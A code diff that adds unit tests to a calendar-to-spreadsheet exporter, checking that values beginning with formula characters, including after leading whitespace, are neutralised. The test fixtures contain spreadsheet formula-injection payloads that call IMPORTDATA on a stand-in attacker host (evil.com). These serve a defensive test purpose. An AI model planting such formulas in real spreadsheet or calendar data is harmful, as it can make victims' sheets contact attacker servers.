@@ -1429,6 +1429,44 @@ test('eventToRow sanitizes values starting with formula metacharacters', () => {
   expect(row[5]).toBe("'-cmd"); // location sanitized
 });
 
+// Test formula injection sanitization with leading whitespace/control characters
+test('eventToRow sanitizes values with leading whitespace/control chars followed by formula metacharacters', () => {
+  const evt = createCalendarEvent({ 
+    id: 'e_whitespace_formula', 
+    title: ' =IMPORTDATA("http://evil.com")', 
+    start: new Date('2026-02-02T10:00:00Z'), 
+    end: new Date('2026-02-02T11:00:00Z'), 
+    description: '\t@IMPORTDATA("http://evil.com")', 
+    location: '\n+DANGEROUS', 
+    attendees: [] 
+  });
+  
+  const row = eventToRow(evt);
+  
+  expect(row[1]).toBe("' =IMPORTDATA(\"http://evil.com\")"); // title with leading space sanitized
+  expect(row[4]).toBe("'\t@IMPORTDATA(\"http://evil.com\")"); // description with leading tab sanitized
+  expect(row[5]).toBe("'\n+DANGEROUS"); // location with leading newline sanitized
+});
+
+// Test that normal values with dangerous chars in middle are not sanitized
+test('eventToRow does not sanitize values with formula chars not at effective start', () => {
+  const evt = createCalendarEvent({ 
+    id: 'e_safe', 
+    title: 'Meeting @3pm', 
+    start: new Date('2026-02-02T10:00:00Z'), 
+    end: new Date('2026-02-02T11:00:00Z'), 
+    description: 'Cost is $100+tax', 
+    location: 'Room 5-A', 
+    attendees: [] 
+  });
+  
+  const row = eventToRow(evt);
+  
+  expect(row[1]).toBe('Meeting @3pm'); // not sanitized
+  expect(row[4]).toBe('Cost is $100+tax'); // not sanitized
+  expect(row[5]).toBe('Room 5-A'); // not sanitized
+});
+
 // Test historical data preservation (no valid dates)
 test('syncCalendarToSheet preserves rows without valid date columns', async () => {
   const calendar = CalendarApp.getDefaultCalendar();
